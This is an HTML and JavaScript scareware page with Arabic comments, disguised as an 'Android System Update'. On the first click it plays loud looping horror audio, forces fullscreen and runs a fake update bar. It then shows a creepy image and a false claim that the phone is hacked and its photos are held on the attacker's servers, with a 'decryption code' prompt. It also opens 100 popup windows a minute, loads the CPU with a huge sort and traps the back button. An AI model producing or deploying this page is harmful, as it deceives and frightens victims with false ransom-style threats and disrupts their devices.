<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚙️ Android System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
        
        /* 1. صورة المرأة: تغطي الشاشة وتتحرك بطريقة مخيفة سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
            object-fit: cover; z-index: 1; display: none;
            filter: contrast(200%) brightness(30%) grayscale(100%);
            animation: breathingStalker 5s infinite ease-in-out;
        }

        @keyframes breathingStalker {
            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%); filter: brightness(30%); }
            50% { transform: scale(1.08) translate(-4%, -4%); filter: brightness(50%); }
        }

        /* 2. واجهة التحديث الوهمية (Deception UI) سواسوة */
        #loaderBox {
            position: fixed; z-index: 100; color: #0f0; text-align: center;
            width: 85%; top: 50%; left: 50%; transform: translate(-50%, -50%);
        }

        .progress-bar { width: 100%; background: #222; height: 8px; border-radius: 4px; margin-top: 15px; overflow: hidden; }
        .progress-fill { width: 0%; background: #0f0; height: 100%; animation: fillLoader 12s forwards; }
        
        @keyframes fillLoader { to { width: 100%; } }

        /* 3. واجهة الرسالة الحمراء (Deep Web Style) سواسوة */
        #deepWebOverlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 200; background: rgba(0,0,0,0.85); color: #f00; 
            display: none; flex-direction: column; justify-content: center; align-items: center;
            text-align: center; font-weight: bold;
        }

        .blink { animation: blinker 0.15s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.2; } }

        #unlockPrompt { border: 1px solid #f00; background: #000; color: #f00; padding: 10px; margin-top: 20px; width: 70%; text-align: center; outline: none; }
    </style>
</head>
<body onclick="initiateInfection()">

    <div id="loaderBox">
        <h2 id="statusText">System Update: 12%</h2>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <p style="font-size: 11px; color: #444; margin-top: 15px;">BOOTLOADER_ACCESS: PENDING...</p>
    </div>

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="deepWebOverlay">
        <h1 class="blink">STALKER SYSTEM INTRUSION</h1>
        <p style="padding: 15px; font-size: 14px;">[CRITICAL]: لقد تم اختراق طبقات الحماية.<br>كل بياناتك وصورك الآن في خوادمنا.<br>لا تغلق الهاتف.. نحن نراك سواسوة.</p>
        <input type="text" id="unlockPrompt" placeholder="أدخل كود فك التشفير">
    </div>

    <audio id="horrorAudio" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>

    <script>
        let isActive = false;

        function initiateInfection() {
            if(isActive) return;
            isActive = true;

            // تفعيل الصوت والشاشة الكاملة سواسوة
            const audio = document.getElementById('horrorAudio');
            audio.volume = 1.0;
            audio.play();
            document.documentElement.requestFullscreen();

            // محاكاة تحميل التحديث سواسوة
            let progress = 12;
            const progressTimer = setInterval(() => {
                progress += Math.floor(Math.random() * 4);
                if(progress >= 100) {
                    progress = 100;
                    clearInterval(progressTimer);
                    triggerStalkerMode();
                }
                document.getElementById('statusText').innerText = `System Update: ${progress}%`;
            }, 400);
        }

        function triggerStalkerMode() {
            document.getElementById('loaderBox').style.display = 'none';
            document.getElementById('stalkerEntity').style.display = 'block';
            document.getElementById('deepWebOverlay').style.display = 'flex';

            // ميزة اللاق الدوري (100 صفحة كل دقيقة) سواسوة
            const lagShock = () => {
                for(let i=0; i<100; i++) {
                    window.open(window.location.href, '_blank', 'width=10,height=10');
                }
                // استهلاك المعالج سواسوة
                let stress = new Array(5000000).fill("💀").sort();
            };

            // أول صدمة بعد 3 ثواني ثم كل دقيقة سواسوة
            setTimeout(lagShock, 3000);
            setInterval(lagShock, 60000);

            // منع زر الرجوع سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
            }, 500);
        }

        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
